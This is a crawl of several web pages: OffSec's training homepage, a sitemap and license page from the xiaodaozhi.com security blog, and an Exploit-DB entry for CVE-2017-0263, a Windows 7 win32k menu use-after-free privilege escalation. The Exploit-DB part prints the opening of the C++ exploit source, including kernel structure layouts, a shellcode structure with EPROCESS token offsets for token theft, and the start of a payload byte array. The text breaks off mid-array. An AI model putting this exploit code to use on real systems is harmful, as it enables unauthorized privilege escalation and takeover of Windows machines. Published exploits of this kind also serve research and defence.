=== Content from www.offsec.com_c84a2d9e_20250126_091000.html ===


* Solutions Learning Solutions            Learning Library Cyber workforce resilience and career development with hands-on, real-world training      Cyber Ranges Live-fire simulations to train your team and stay ahead of the latest threats         [Courses & Certifications

  Industry-leading certifications and training for continuous learning](https://www.offsec.com/courses-and-certifications)   [Learning Paths

  Focused training to develop skills based on a specific area of interest](https://www.offsec.com/learning/paths)   [Job Roles

  Rigorous training content and labs for the most critical and in-demand job roles](https://www.offsec.com/learning)   [Skills Development

  Focused training to develop critical cybersecurity skills](https://www.offsec.com/learning/skill-paths-pins)   [Industry Frameworks

  Framework-specific training for MITRE ATT&CK, D3FEND and NIST/NICE](https://www.offsec.com/learning/industry-frameworks)   [Explore Learning Library](https://portal.offsec.com/)     [New course

  IR-200: Foundational Incident Response

  IR-200 teaches the incident response lifecycle, including detection, analysis, containment, eradication and recovery. Learners develop hands-on skills responding to, communicating, and mitigating cyber attacks.

  ![IR-200: Foundational Incident Response](https://manage.offsec.com/app/uploads/2024/10/Course-IR-200.png)](https://www.offsec.com/courses/ir-200/)     [Enterprise Cyber Range & Versus

  Set up tournaments and test red and blue team skills in a live-fire cyber range](https://www.offsec.com/enterprise/cyber-range)   [Offensive Cyber Range

  Train on the latest attack vectors to address vulnerabilities](https://www.offsec.com/enterprise/cyber-range/offensive)   [Defensive Cyber Range

  Prepare for the next attack with simulated real-world training environments](https://www.offsec.com/enterprise/cyber-range/defensive)   [Watch a demo](https://learn.offsec.com/webinar-cyber-drills-versus/?utm_source=offsec)     [Exclusive

  Hands-on training in live-fire, enterprise environments

  Use our most powerful cyber range to develop a cyber resilient workforce

  ![Hands-on training in live-fire, enterprise environments](https://manage.offsec.com/app/uploads/2024/05/live_fire_feat.png)](https://www.offsec.com/enterprise/cyber-range/versus)
* Why OffSec            Organizations Continuous learning & skill development to build cyber workforce resilience      Individuals Get industry leading training and reinforce learning with hands-on labs         [Teams & Enterprises

  Continuous learning & hands-on skills development for cybersecurity teams](https://www.offsec.com/organizations/enterprise)   [Public Sector

  Unique training for government agencies and educational institutions](https://www.offsec.com/public-sector)   [Use Cases

  Meet critical cyber workforce needs with OffSec's learning platform](https://www.offsec.com/use-cases)   [Industries

  Purpose-built and industry-recognized cybersecurity training](https://www.offsec.com/industry)   [Contact sales](https://www.offsec.com/sales)     [Recommended

  Learn Enterprise

  Address your talent gap through continuous skills development and knowledge acquisition

  ![Learn Enterprise](https://manage.offsec.com/app/uploads/2024/05/le_feat_nav_icon.png)](https://www.offsec.com/products/learn-enterprise)     [Attain a Certification

  Prove critical knowledge & skills with an industry-standard certification](https://www.offsec.com/courses-and-certifications)   [Get Hands-on Practice

  Challenge yourself in real-world lab environments](https://www.offsec.com/labs/individual)   [Increase Career Prospects

  Ready yourself for the next step in your cybersecurity career](https://www.offsec.com/products)   [Buy now](https://www.offsec.com/register/)     [New course

  IR-200: Foundational Incident Response

  IR-200 teaches the incident response lifecycle, including detection, analysis, containment, eradication and recovery. Learners develop hands-on skills responding to, communicating, and mitigating cyber attacks.

  ![IR-200: Foundational Incident Response](https://manage.offsec.com/app/uploads/2024/10/Course-IR-200.png)](https://www.offsec.com/courses/ir-200/)
* Pricing Plans & Pricing            Organizations Flexible solutions designed for organizations across industries and sizes      Individuals Find the right training plan for your unique learning needs         [Subscription Pricing

  Provide continuous Learning Library access to build cyber workforce resilience](https://www.offsec.com/pricing/organization)   [Cyber Ranges

  Hands-on training in live-fire, simulation environments](https://www.offsec.com/labs/enterprise)   [Pentesting Services

  Let OffSec conduct a comprehensive vulnerability assessment](https://www.offsec.com/penetration-testing)   [Contact sales](https://www.offsec.com/sales)     [Recommended

  Learn Enterprise

  Provide continuous learning and skill development with Learn Enterprise. Access to the entire Learning Library and the Enterprise Cyber Range for everyone on your team.

  ![Learn Enterprise](https://manage.offsec.com/app/uploads/2024/05/le_feat_nav_icon.png)](https://www.offsec.com/products/learn-enterprise/)     [Pricing

  Flexible options based on your learning goals](https://www.offsec.com/pricing/individual)   [![Learn One](/_astro/one.CuIttstx_1iqdIc.svg)   Learn One

  12-month access to a single course, related labs, and two exam attempts](https://www.offsec.com/products/learn-one)   [![Course & Certification Bundle](/_astro/courses.DUpgYt2-_ZJbVTu.svg)   Course & Certification Bundle

  90-day access to a single course, related labs, and one exam attempt](https://www.offsec.com/products/90-day-bundle)   [![Learn Fundamentals](/_astro/fundamentals.iMOuAzP9_Z1YsvOA.svg)   Learn Fundamentals

  12-month access to introductory- and essential-level content](https://www.offsec.com/products/fundamentals)   [Proving Grounds Labs

  OffSec-curated private labs to practice and perfect your pentesting skills](https://www.offsec.com/labs/individual)   [Buy now](https://www.offsec.com/register/)     [New course

  IR-200: Foundational Incident Response

  IR-200 teaches the incident response lifecycle, including detection, analysis, containment, eradication and recovery. Learners develop hands-on skills responding to, communicating, and mitigating cyber attacks.

  ![IR-200: Foundational Incident Response](https://manage.offsec.com/app/uploads/2024/10/Course-IR-200.png)](https://www.offsec.com/courses/ir-200)
* Partners         [Global Partner Program](https://www.offsec.com/global-partners)   [Partner Portal Login](https://partnerportal.offsec.com/?utm_source=offsec#/page/login)   [Find a Partner](https://www.offsec.com/partner-locator)

  Become a Partner

  Add OffSec to your list of training providers

   [Partner with us](https://www.offsec.com/global-partners/#application)
* Community Kali & Community         [Join Our Community](https://www.offsec.com/community-sign-up)   [Kali Linux](http://www.kali.org/get-kali/?utm_source=offsec)   [Community Projects](https://www.offsec.com/community-projects)   [OffSec Discord](https://offs.ec/discord?utm_source=offsec)   [OffSec Live](https://www.twitch.tv/offsecofficial?utm_source=offsec)

  Connect with us

  OffSec office hours every Friday on Twitch

   [OffSec Twitch](https://www.twitch.tv/offsecofficial?utm_source=offsec)
* Resources
  + [Read](https://www.offsec.com/resources)
  - [Blog](https://www.offsec.com/blog/)
  - [Case Studies](https://www.offsec.com/resources/case-study)
  - [Guides](https://www.offsec.com/resources/guides)
  - [White Papers](https://www.offsec.com/resources/whitepaper)
  - [Product Updates](https://www.offsec.com/resources/product-updates)
  + Watch
  - [Webinars](https://www.offsec.com/webinars)
  - [Twitch](https://www.twitch.tv/offsecofficial?utm_source=offsec)
  - [YouTube](https://www.youtube.com/%40OffSecTraining?utm_source=offsec)
  + Learn
  - [Cyberversity](https://www.offsec.com/cyberversity)
  - [Cybersecurity Job Roles](https://www.offsec.com/cybersecurity-roles)
  + Work at OffSec
  - [Careers](https://www.offsec.com/careers)
  - [Values](https://www.offsec.com/values)
  + [Live Training & Events](https://www.offsec.com/training-and-events)
  + [Subscribe to our Newsletters](https://www.offsec.com/subscriptions)
  + [Press Room](https://www.offsec.com/press-room)
  + [Help Center](https://help.offsec.com/hc/en-us?utm_source=offsec)
  + [Swag Store](https://offsec.usa.dowlis.com/?utm_source=offsec)   [View the Resource Center](/resources/)        [Press Release

  Leeds Equity Partners Acquires OffSec

  Leeds Equity Partners announced that it has acquired OffSec, the leading provider of continuous cybersecurity workforce development training and professional education for cybersecurity practitioners from Spectrum Equity

  ![Leeds Equity Partners Acquires OffSec](https://manage.offsec.com/wp-content/uploads/2023/08/Homepage-default-preview.jpg)](https://www.prnewswire.com/news-releases/leeds-equity-partners-acquires-offsec-302275836.html?utm_source=offsec)
      [Buy now](/pre-registration/)  [Sign In](https://portal.offensive-security.com/sign-in/)    [Contact](/contact-us/)

* Solutions Learning Solutions            Learning Library Cyber workforce resilience and career development with hands-on, real-world training      Cyber Ranges Live-fire simulations to train your team and stay ahead of the latest threats         [Courses & Certifications

  Industry-leading certifications and training for continuous learning](https://www.offsec.com/courses-and-certifications)   [Learning Paths

  Focused training to develop skills based on a specific area of interest](https://www.offsec.com/learning/paths)   [Job Roles

  Rigorous training content and labs for the most critical and in-demand job roles](https://www.offsec.com/learning)   [Skills Development

  Focused training to develop critical cybersecurity skills](https://www.offsec.com/learning/skill-paths-pins)   [Industry Frameworks

  Framework-specific training for MITRE ATT&CK, D3FEND and NIST/NICE](https://www.offsec.com/learning/industry-frameworks)   [Explore Learning Library](https://portal.offsec.com/)     [New course

  IR-200: Foundational Incident Response

  IR-200 teaches the incident response lifecycle, including detection, analysis, containment, eradication and recovery. Learners develop hands-on skills responding to, communicating, and mitigating cyber attacks.

  ![IR-200: Foundational Incident Response](https://manage.offsec.com/app/uploads/2024/10/Course-IR-200.png)](https://www.offsec.com/courses/ir-200/)     [Enterprise Cyber Range & Versus

  Set up tournaments and test red and blue team skills in a live-fire cyber range](https://www.offsec.com/enterprise/cyber-range)   [Offensive Cyber Range

  Train on the latest attack vectors to address vulnerabilities](https://www.offsec.com/enterprise/cyber-range/offensive)   [Defensive Cyber Range

  Prepare for the next attack with simulated real-world training environments](https://www.offsec.com/enterprise/cyber-range/defensive)   [Watch a demo](https://learn.offsec.com/webinar-cyber-drills-versus/?utm_source=offsec)     [Exclusive

  Hands-on training in live-fire, enterprise environments

  Use our most powerful cyber range to develop a cyber resilient workforce

  ![Hands-on training in live-fire, enterprise environments](https://manage.offsec.com/app/uploads/2024/05/live_fire_feat.png)](https://www.offsec.com/enterprise/cyber-range/versus)
* Why OffSec            Organizations Continuous learning & skill development to build cyber workforce resilience      Individuals Get industry leading training and reinforce learning with hands-on labs         [Teams & Enterprises

  Continuous learning & hands-on skills development for cybersecurity teams](https://www.offsec.com/organizations/enterprise)   [Public Sector

  Unique training for government agencies and educational institutions](https://www.offsec.com/public-sector)   [Use Cases

  Meet critical cyber workforce needs with OffSec's learning platform](https://www.offsec.com/use-cases)   [Industries

  Purpose-built and industry-recognized cybersecurity training](https://www.offsec.com/industry)   [Contact sales](https://www.offsec.com/sales)     [Recommended

  Learn Enterprise

  Address your talent gap through continuous skills development and knowledge acquisition

  ![Learn Enterprise](https://manage.offsec.com/app/uploads/2024/05/le_feat_nav_icon.png)](https://www.offsec.com/products/learn-enterprise)     [Attain a Certification

  Prove critical knowledge & skills with an industry-standard certification](https://www.offsec.com/courses-and-certifications)   [Get Hands-on Practice

  Challenge yourself in real-world lab environments](https://www.offsec.com/labs/individual)   [Increase Career Prospects

  Ready yourself for the next step in your cybersecurity career](https://www.offsec.com/products)   [Buy now](https://www.offsec.com/register/)     [New course

  IR-200: Foundational Incident Response

  IR-200 teaches the incident response lifecycle, including detection, analysis, containment, eradication and recovery. Learners develop hands-on skills responding to, communicating, and mitigating cyber attacks.

  ![IR-200: Foundational Incident Response](https://manage.offsec.com/app/uploads/2024/10/Course-IR-200.png)](https://www.offsec.com/courses/ir-200/)
* Pricing Plans & Pricing            Organizations Flexible solutions designed for organizations across industries and sizes      Individuals Find the right training plan for your unique learning needs         [Subscription Pricing

  Provide continuous Learning Library access to build cyber workforce resilience](https://www.offsec.com/pricing/organization)   [Cyber Ranges

  Hands-on training in live-fire, simulation environments](https://www.offsec.com/labs/enterprise)   [Pentesting Services

  Let OffSec conduct a comprehensive vulnerability assessment](https://www.offsec.com/penetration-testing)   [Contact sales](https://www.offsec.com/sales)     [Recommended

  Learn Enterprise

  Provide continuous learning and skill development with Learn Enterprise. Access to the entire Learning Library and the Enterprise Cyber Range for everyone on your team.

  ![Learn Enterprise](https://manage.offsec.com/app/uploads/2024/05/le_feat_nav_icon.png)](https://www.offsec.com/products/learn-enterprise/)     [Pricing

  Flexible options based on your learning goals](https://www.offsec.com/pricing/individual)   [![Learn One](/_astro/one.CuIttstx_1iqdIc.svg)   Learn One

  12-month access to a single course, related labs, and two exam attempts](https://www.offsec.com/products/learn-one)   [![Course & Certification Bundle](/_astro/courses.DUpgYt2-_ZJbVTu.svg)   Course & Certification Bundle

  90-day access to a single course, related labs, and one exam attempt](https://www.offsec.com/products/90-day-bundle)   [![Learn Fundamentals](/_astro/fundamentals.iMOuAzP9_Z1YsvOA.svg)   Learn Fundamentals

  12-month access to introductory- and essential-level content](https://www.offsec.com/products/fundamentals)   [Proving Grounds Labs

  OffSec-curated private labs to practice and perfect your pentesting skills](https://www.offsec.com/labs/individual)   [Buy now](https://www.offsec.com/register/)     [New course

  IR-200: Foundational Incident Response

  IR-200 teaches the incident response lifecycle, including detection, analysis, containment, eradication and recovery. Learners develop hands-on skills responding to, communicating, and mitigating cyber attacks.

  ![IR-200: Foundational Incident Response](https://manage.offsec.com/app/uploads/2024/10/Course-IR-200.png)](https://www.offsec.com/courses/ir-200)
* Partners         [Global Partner Program](https://www.offsec.com/global-partners)   [Partner Portal Login](https://partnerportal.offsec.com/?utm_source=offsec#/page/login)   [Find a Partner](https://www.offsec.com/partner-locator)

  Become a Partner

  Add OffSec to your list of training providers

   [Partner with us](https://www.offsec.com/global-partners/#application)
* Community Kali & Community         [Join Our Community](https://www.offsec.com/community-sign-up)   [Kali Linux](http://www.kali.org/get-kali/?utm_source=offsec)   [Community Projects](https://www.offsec.com/community-projects)   [OffSec Discord](https://offs.ec/discord?utm_source=offsec)   [OffSec Live](https://www.twitch.tv/offsecofficial?utm_source=offsec)

  Connect with us

  OffSec office hours every Friday on Twitch

   [OffSec Twitch](https://www.twitch.tv/offsecofficial?utm_source=offsec)
* Resources
  + [Read](https://www.offsec.com/resources)
  - [Blog](https://www.offsec.com/blog/)
  - [Case Studies](https://www.offsec.com/resources/case-study)
  - [Guides](https://www.offsec.com/resources/guides)
  - [White Papers](https://www.offsec.com/resources/whitepaper)
  - [Product Updates](https://www.offsec.com/resources/product-updates)
  + Watch
  - [Webinars](https://www.offsec.com/webinars)
  - [Twitch](https://www.twitch.tv/offsecofficial?utm_source=offsec)
  - [YouTube](https://www.youtube.com/%40OffSecTraining?utm_source=offsec)
  + Learn
  - [Cyberversity](https://www.offsec.com/cyberversity)
  - [Cybersecurity Job Roles](https://www.offsec.com/cybersecurity-roles)
  + Work at OffSec
  - [Careers](https://www.offsec.com/careers)
  - [Values](https://www.offsec.com/values)
  + [Live Training & Events](https://www.offsec.com/training-and-events)
  + [Subscribe to our Newsletters](https://www.offsec.com/subscriptions)
  + [Press Room](https://www.offsec.com/press-room)
  + [Help Center](https://help.offsec.com/hc/en-us?utm_source=offsec)
  + [Swag Store](https://offsec.usa.dowlis.com/?utm_source=offsec)   [View the Resource Center](/resources/)        [Press Release

  Leeds Equity Partners Acquires OffSec

  Leeds Equity Partners announced that it has acquired OffSec, the leading provider of continuous cybersecurity workforce development training and professional education for cybersecurity practitioners from Spectrum Equity

  ![Leeds Equity Partners Acquires OffSec](https://manage.offsec.com/wp-content/uploads/2023/08/Homepage-default-preview.jpg)](https://www.prnewswire.com/news-releases/leeds-equity-partners-acquires-offsec-302275836.html?utm_source=offsec)
      [Buy now](/pre-registration/) [Sign in](https://portal.offensive-security.com/sign-in/)   [Contact us](/contact-us/)   Learning Solutions  Why OffSec  Plans & Pricing  Partners  Kali & Community  Resources       Dismiss

Looking for Live Training in 2025? -
[View upcoming classes](/training-and-events/)

# Elevating Cyber Workforce and Professional Development

Empowering individuals and organizations to fight cyber threats with indispensable cybersecurity skills and resources.

   [For individuals](/pricing/)  [For organizations](/organizations/enterprise/)
## Trusted by

      ![](/_astro/courses-honeycomb-2.BJsud3cm_AM0V4.svg)
## Learning with OffSec

Our learning platform and library include the most rigorous content, courses, learning paths
and hands-on labs

 [Explore our products](/products/)
## What you'll find in our Learning Library

### 7,800+

Hours of written content

### 1,600+

Videos

### 5,460

Labs

\*Data as of 1/24/2025

 [Watch demo](/resources/gated-content/le-ocr-demo/)
## Find OffSec training for your cybersecurity role or area of responsibility

![](/_astro/offensive.keLynG0W.svg)
### Offensive Security

Essentials

Intermediate

Advanced

   ![](/_astro/defensive.Cxk9T0J8.svg)
### Defensive Security

Essentials

Intermediate

Advanced

   ![](/_astro/secure.ZQsGZjKL.svg)
### Secure Development

Essentials

Intermediate

Advanced

   ![](/_astro/admin.2EArHmUa.svg)
### IT Team cybersecurity

Essentials

Intermediate

Entry-level

Essentials

Intermediate

Advanced

 [![](/_astro/sec-100.Cpi0-2Uw.svg)
### CyberCore

Gain core knowledge required for any cybersecurity role](/courses/sec-100/)       ![Offensive](/_astro/offensive.keLynG0W.svg)
### Offensive Security

Understand the attacker mindset

 ![Offensive](/_astro/offensive.keLynG0W.svg)
### Offensive Security

Develop hacking and pentesting skills

 ![Offensive](/_astro/offensive.keLynG0W.svg)
### Offensive Security

Expert protections across organizations

    ![Defensive](/_astro/defensive.Cxk9T0J8.svg)
### Defensive Security

Understand defensive requirements

 ![Defensive](/_astro/defensive.Cxk9T0J8.svg)
### Defensive Security

Develop mitigation procedures

 ![Defensive](/_astro/defensive.Cxk9T0J8.svg)
### Defensive Security

Proactive, resilient defenses

    ![Secure](/_astro/secure.ZQsGZjKL.svg)
### Secure Development

Learn risks and track security in development

 ![Secure](/_astro/secure.ZQsGZjKL.svg)
### Secure Development

Integrate security best practices into dev

 ![Secure](/_astro/secure.ZQsGZjKL.svg)
### Secure Development

Security first software development lifecycle

    ![Cybersecurity](/_astro/admin.2EArHmUa.svg)
### IT Team cybersecurity

Understand cybersecurity for IT and System Admins

 ![Cybersecurity](/_astro/admin.2EArHmUa.svg)
### IT Team cybersecurity

Develop secure processes

= Course Certification

= Learning Path Badge

## What cybersecurity professionals are saying

     ![Duane LaFlotte](/_astro/duane.CAyBZp_-.png)
### Duane LaFlotte

CTO, Pulsar Security

  I feel like every person's first experience in cybersecurity should be OffSec. Before you go out to figure out how to create a zero-day and you get confused, if you start with OffSec, that won't happen due to how methodologically all the training is put together.      ![Emile Kok](/_astro/emile.C3f2EqfQ.png)
### Emile Kok

Founder and Managing Director, TSTC Institute

  When going to the real world, you have to know what you're doing and understand what is expected from you on the job. For us, OffSec is the champion in this league in educating and preparing learners.      ![Douglas Costa](/_astro/douglas.BdxOPM2d.png)
### Douglas Costa

Cyber Threat Intelligence & Threat Hunter

  This certification reinforces my ability to think creatively, manage time and resources effectively, and persist through complex challenges.
## Cybersecurity talent management with OffSec

### Assess

#### Goal of this stage

Understand skills of candidates to pick the right person for open roles.

#### How OffSec can help

Build tournaments to assess candidates in real-world scenarios. Renowned certifications can be used to in the application process.

 [Check out Assessments](/enterprise/cyber-range/)

Assess

### Onboard

#### Goal of this stage

Train teams to get them up to speed for their new roles and build a foundation of shared knowledge across the team.

#### How OffSec can help

Entry-level courses ground teams in the OffSec mindset. Job role based learning paths & courses support specific roles get up to speed faster.

 [Explore the Library](https://portal.offsec.com)

Onboard

### Upskill

#### Goal of this stage

Identify skill gaps and train to fill those gaps to protect the organization.

#### How OffSec can help

Identify skill gaps with learning path assessments & Versus tournaments. Build custom learning paths for team members to get them the training they need to protect the organization.

 [Build a Custom Learning Path](https://learn.offsec.com/hubfs/Creating%20a%20custom%20path.mp4)

Upskill

### Retain

#### Goal of this stage

Build an engaging employee culture and career development plans that continue to challenge employees.

#### How OffSec can help

Build team camaraderie with Versus tournaments. Develop custom training for job roles & increase difficulty over time.

 [Try a Tournament](/enterprise/cyber-range/versus/)

Retain

## Our unique learning approach

#### Growth

Practicing creative applications leads to growth and knowledge expansion

#### Triumph

Create confidence, pattern recognition, wisdom and allow the cycle to repeat for new learnings

#### Trial

The trial process equips our learner to understand, learn, apply, analyze, synthesize and hypothesize

#### Failure

Failure is a key part of learning, how to get unstuck is a key skill. Grit is necessary to learn

#### Adaptation

Creative ideas and approaches will emerge through trial and failure

## What's new at OffSec

   [![](https://www.offsec.com/app/uploads/2025/01/ir-200-450x236.png)

Research & Tutorials

### My Journey with IR-200: Becoming an OffSec Certified Incident Responder (OSIR)

Embark on a journey to become an OffSec Certified Incident Responder (OSIR) through the IR-200 course, as described by a Student Mentor who tested its effectiveness.

Jan 24, 2025

6 min read](/blog/my-journey-with-ir-200-becoming-an-offsec-certified-incident-responder-osir/)   [![](https://www.offsec.com/app/uploads/2025/01/th-200-450x236.png)

Research & Tutorials

### A Student Mentorâs TH-200 and OSTH Learning Experience

Explore the TH-200 course & OSTH exam with an OffSec Mentor’s insights on mastering threat hunting skills.

Jan 24, 2025

9 min read](/blog/a-student-mentors-th-200-and-osth-learning-experience/)   [![](https://www.offsec.com/app/uploads/2024/12/EOY-2024-blog-post-header-450x236.jpg)

OffSec News

### OffSec Yearly Recap 2024

Join us as we explore all our successes in 2024, including exciting new content, courses, and so much more!

Dec 23, 2024

8 min read](/blog/offsec-yearly-recap-2024/)     [View all blogs](/blog/)
## Our free open-source tools

  [![Kali](/_astro/kali.CU8ZWzHb_21DCwb.svg)](https://kali.org)  [![Kali NetHunter](/_astro/KNH.Cqcp042z_Z1swOvJ.svg)](https://www.kali.org/docs/nethunter/)  [![Exploit Database](/_astro/EXDB.BZmZGyho_2oAweA.svg)](https://exploit-db.org)  [![Google hacking database](/_astro/GHDB.BMpIw1YW_kqYpF.svg)](https://www.exploit-db.com/google-hacking-database)  [![Metasploit Unleashed](/_astro/metasploit.CWelKEsw_Z1kLJ3A.svg)](https://www.offsec.com/metasploit-unleashed/)

Get the latest updates around resources, events & promotions from OffSec

 Submit        Products and Pricing

* [Courses & Content](https://www.offsec.com/courses-and-certifications/)
* [Learn Subscriptions](https://www.offsec.com/products/)
* [Proving Grounds Labs](https://www.offsec.com/labs/individual/)
* [Enterprise Cyber Range](https://www.offsec.com/enterprise/cyber-range/)
* [Pricing](https://www.offsec.com/pricing/)
 About OffSec

* [Contact Us](https://www.offsec.com/contact-us/)
* [Careers](https://www.offsec.com/careers/)
* [Why OffSec?](https://www.offsec.com/why-offsec/)
* [Values](https://www.offsec.com/values/)
* [Leadership Team](https://www.offsec.com/leadership-team/)
* [Bug Bounty Program](https://www.offsec.com/bug-bounty-program/)
* [User-Generated Content](https://www.offsec.com/labs/submit/)
 Resources

* [Resource Center](https://www.offsec.com/resources/)
* [Blog](https://www.offsec.com/blog/)
* [OffSec Cyberversity](https://www.offsec.com/cyberversity/)
* [Press Room](https://www.offsec.com/press-room/)
* [Join our Mailing List](https://www.offsec.com/subscriptions/)
* [Help Center](https://help.offensive-security.com/hc/en-us?utm_source=offsec)
* [Swag Store](https://offsec.usa.dowlis.com/?utm_source=offsec)

  [Feedback](https://www.offsec.com/contact-us/)[Legal](https://www.offsec.com/legal-docs/)[Trust & Compliance](https://trust.offsec.com/?utm_source=offsec)[RSS Feed](https://www.offsec.com/feed)  Â© OffSec Services Limited 2025 All rights reserved

=== Content from xiaodaozhi.com_39e01202_20250126_091020.html ===
xml version="1.0" encoding="utf-8"?
xml-stylesheet type='text/xsl' href='https://xiaodaozhi.com/usr/plugins/Sitemap/sitemap.xsl'?

https://xiaodaozhi.com/win32k-window-message.html
2018-09-11
always
0.8

https://xiaodaozhi.com/win32k-gdi-object.html
2018-06-07
always
0.8

https://xiaodaozhi.com/links.html
2019-05-10
always
0.8

https://xiaodaozhi.com/tags.html
2018-04-15
always
0.8

https://xiaodaozhi.com/archives.html
2018-04-15
always
0.8

https://xiaodaozhi.com/who-am-i.html
2021-08-20
always
0.8

https://xiaodaozhi.com/license.html
2021-08-21
always
0.8

https://xiaodaozhi.com/security/195.html
2022-12-08
always
0.5

https://xiaodaozhi.com/security/172.html
2021-09-05
always
0.5

https://xiaodaozhi.com/exploit/156.html
2019-04-09
always
0.5

https://xiaodaozhi.com/exploit/149.html
2018-09-13
always
0.5

https://xiaodaozhi.com/exploit/135.html
2018-06-08
always
0.5

https://xiaodaozhi.com/exploit/132.html
2021-06-17
always
0.5

https://xiaodaozhi.com/exploit/122.html
2018-09-16
always
0.5

https://xiaodaozhi.com/exploit/117.html
2020-07-28
always
0.5

https://xiaodaozhi.com/exploit/71.html
2020-07-28
always
0.5

https://xiaodaozhi.com/exploit/70.html
2022-03-22
always
0.5

https://xiaodaozhi.com/exploit/56.html
2018-06-08
always
0.5

https://xiaodaozhi.com/exploit/42.html
2019-09-16
always
0.5

https://xiaodaozhi.com/exploit/32.html
2018-06-08
always
0.5

https://xiaodaozhi.com/kernel/31.html
2021-08-21
always
0.5

https://xiaodaozhi.com/kernel/30.html
2021-08-21
always
0.5

https://xiaodaozhi.com/exploit/29.html
2018-10-18
always
0.5

https://xiaodaozhi.com/analysis/28.html
2018-06-08
always
0.5

https://xiaodaozhi.com/develop/25.html
2018-06-08
always
0.5

https://xiaodaozhi.com/kernel/22.html
2018-06-08
always
0.5

https://xiaodaozhi.com/kernel/20.html
2019-06-06
always
0.5

https://xiaodaozhi.com/kernel/18.html
2021-08-21
always
0.5

https://xiaodaozhi.com/analysis/13.html
2018-06-08
always
0.5

https://xiaodaozhi.com/kernel/4.html
2022-08-16
always
0.5

https://xiaodaozhi.com/gossip/1.html
2018-06-08
always
0.5



=== Content from xiaodaozhi.com_d2a6b3eb_20250126_091028.html ===

小刀志
[首页](/ "首页 home")
[归档](https://xiaodaozhi.com/archives.html "归档 archives")
[标签](https://xiaodaozhi.com/tags.html "标签 tags")
[链接](https://xiaodaozhi.com/links.html "链接 links")
[我是谁](https://xiaodaozhi.com/who-am-i.html "我是谁 whoami")

![小刀志](/img/author.png)
小刀志

稻草小刀的在线笔记。记录所有事情，并写给自己。

搜索关键字

# 知识产权许可声明

本站文章均为原创内容。除标注为“已投稿其他平台”的内容之外，其余内容（包括但不限于文字、图片、文档、代码等内容）均采用《[知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议](https://creativecommons.org/licenses/by-nc-sa/4.0/)》进行许可，著作权为作者本人所有，转载请注明来源。本页面中的许可声明是普遍性许可。如需额外的授权，请联系作者。

技术性文章中所描述的技术仅作为学习和研究目的，作者不对这些技术的可靠性和合法性负责。任何商业、非商业的使用所造成的风险应该由使用者自行承担。

本站文章所链接的站外发布的代码，作者属于文章作者的，按照其所在平台所刊载的协议进行授权。

如果对本声明有任何疑问，请在本页面下方评论。

---

**Intellectual Property Rights Statement**

All articles in this site are original. Except for the articles marked as contributions to other platforms, the rest of the articles (including but not limited to text, pictures, documents, codes and other content) are all licensed under a *[Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License](https://creativecommons.org/licenses/by-nc-sa/4.0/)*, while the copyright is owned by the author. Reproduction requires indication of source. The permission statement in this page is universal permission. For additional authorization, contact the author.

The techniques described in the technical articles is only for the purpose of learning and research, while the author is not responsible for the reliability and legitimacy of these techniques. The risk of any commercial or non-commercial use should be borne by the user.

The codes posted outside this site linked by the articles in this site, whose author is of these articles as well, are authorized according to the lisences published on the target platforms.

Any questions about this statement can be commented below.

@2015 - CURRENT

### 没有评论

内容

* 发表评论

© 2025 [小刀志](https://xiaodaozhi.com/)
*·* [网站地图](https://xiaodaozhi.com/sitemap.xml)
*·* [许可声明](https://xiaodaozhi.com/license.html)
*·* [京ICP备18017134号-1](https://beian.miit.gov.cn/) *·* 京公网安备11010502035375号

* 文章目录

---



=== Content from www.exploit-db.com_9821027a_20250125_135324.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Microsoft Windows Manager (7 x86) - Menu Management Component UAF Privilege Elevation

#### EDB-ID:

###### 44478

#### CVE:

###### [2017-0263](https://nvd.nist.gov/vuln/detail/CVE-2017-0263)

---

**EDB Verified:**

#### Author:

###### [xiaodaozhi](/?author=9421)

#### Type:

###### [local](/?type=local)

---

#### Platform:

###### [Windows\_x86](/?platform=windows_x86)

#### Date:

###### 2018-03-26

---

**Vulnerable App:**

```
#include <Windows.h>
#include <wingdi.h>
#include <iostream>
#include <Psapi.h>
#pragma comment(lib, "psapi.lib")

#define POCDEBUG 0

#if POCDEBUG == 1
#define POCDEBUG_BREAK() getchar()
#elif POCDEBUG == 2
#define POCDEBUG_BREAK() DebugBreak()
#else
#define POCDEBUG_BREAK()
#endif

static PVOID(__fastcall *pfnHMValidateHandle)(HANDLE, BYTE) = NULL;

static constexpr UINT num_PopupMenuCount = 2;
static constexpr UINT num_WndShadowCount = 3;
static constexpr UINT num_NtUserMNDragLeave = 0x11EC;
static constexpr UINT num_offset_WND_pcls = 0x64;

static HMENU hpopupMenu[num_PopupMenuCount] = { 0 };
static UINT  iMenuCreated  = 0;
static BOOL  bDoneExploit  = FALSE;
static DWORD popupMenuRoot = 0;
static HWND  hWindowMain   = NULL;
static HWND  hWindowHunt   = NULL;
static HWND  hWindowList[0x100] = { 0 };
static UINT  iWindowCount  = 0;
static PVOID pvHeadFake = NULL;
static PVOID pvAddrFlags = NULL;

typedef struct _HEAD {
    HANDLE  h;
    DWORD   cLockObj;
} HEAD, *PHEAD;

typedef struct _THROBJHEAD {
    HEAD    head;
    PVOID   pti;
} THROBJHEAD, *PTHROBJHEAD;

typedef struct _DESKHEAD {
    PVOID   rpdesk;
    PBYTE   pSelf;
} DESKHEAD, *PDESKHEAD;

typedef struct _THRDESKHEAD {
    THROBJHEAD  thread;
    DESKHEAD    deskhead;
} THRDESKHEAD, *PTHRDESKHEAD;

typedef struct _SHELLCODE {
    DWORD reserved;
    DWORD pid;
    DWORD off_CLS_lpszMenuName;
    DWORD off_THREADINFO_ppi;
    DWORD off_EPROCESS_ActiveLink;
    DWORD off_EPROCESS_Token;
    PVOID tagCLS[0x100];
    BYTE  pfnWindProc[];
} SHELLCODE, *PSHELLCODE;

static PSHELLCODE pvShellCode = NULL;

// Arguments:
// [ebp+08h]:pwnd   = pwndWindowHunt;
// [ebp+0Ch]:msg    = 0x9F9F;
// [ebp+10h]:wParam = popupMenuRoot;
// [ebp+14h]:lParam = NULL;
// In kernel-mode, the first argument is tagWND pwnd.
static
BYTE
xxPayloadWindProc[] = {
    // Loader+0x108a:
